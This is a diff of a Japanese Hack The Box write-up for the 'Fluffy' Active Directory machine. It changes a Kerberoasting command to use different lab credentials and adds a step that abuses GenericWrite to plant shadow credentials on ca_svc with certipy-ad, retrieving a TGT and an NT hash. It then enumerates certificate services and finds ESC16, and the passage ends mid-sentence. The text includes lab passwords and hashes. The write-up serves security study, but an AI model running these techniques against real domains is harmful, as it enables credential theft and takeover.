@@ -191,9 +191,9 @@ LDAP        10.129.180.164  389    DC01             winrm service
 ```
 ユーザwirm serviceはspnが設定されていたためkerberoast経由でtgsは取得できたが、rockyou.txtではクラックできなかった
 ```sh
-└─$ netexec ldap 10.129.180.164 -u j.fleischman -p 'J0elTHEM4n1990!' --kdcHost 10.129.180.164 --kerberoasting kerberoas.txt
+└─$ netexec ldap 10.129.180.164 -u p.agila -p 'prometheusx-303' --kdcHost 10.129.180.164 --kerberoasting kerberoas.txt
 LDAP        10.129.180.164  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
-LDAP        10.129.180.164  389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+LDAP        10.129.180.164  389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
 LDAP        10.129.180.164  389    DC01             [*] Skipping disabled account: krbtgt
 LDAP        10.129.180.164  389    DC01             [*] Total of records returned 3
 LDAP        10.129.180.164  389    DC01             [*] sAMAccountName: ca_svc, memberOf: ['CN=Service Accounts,CN=Users,DC=fluffy,DC=htb', 'CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb'], pwdLastSet: 2025-04-17 16:07:50.136701, lastLogon: 2025-05-21 22:21:15.969274
@@ -338,4 +338,92 @@ a599d11e8afd3ae88a721964b11b7671
 ```
 
 
-## STEP 3
+## STEP 4
+step3で侵害したwinrm_svcが所属するservice accountsグループはca_svcに対するgenericwrite権限を有していた  
+ということで、step3と同じ攻撃手法でshadowcredentialsを追加できるね  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_03.png">  
+ということで、ca_svcのtgtとntハッシュを取得
+```sh
+└─$ certipy-ad shadow -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 -target-ip 10.129.250.233 -account ca_svc auto
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'a88535fb319e4e74a72f0c442d737e61'
+[*] Adding Key Credential with device ID 'a88535fb319e4e74a72f0c442d737e61' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID 'a88535fb319e4e74a72f0c442d737e61' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+```
+脆弱性を調査すると、esc16を確認  
+esc16は拡張機能の無効の結果、upnが偽造することができユーザのなりすましが可能になる
+```sh
+─$ certipy-ad find -stdout -target 10.129.250.233 -enabled -vulnerable -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8        
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
+[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates
+```
+upnの変更はwrite権限が必要であるため、ca_svcユーザ権限で
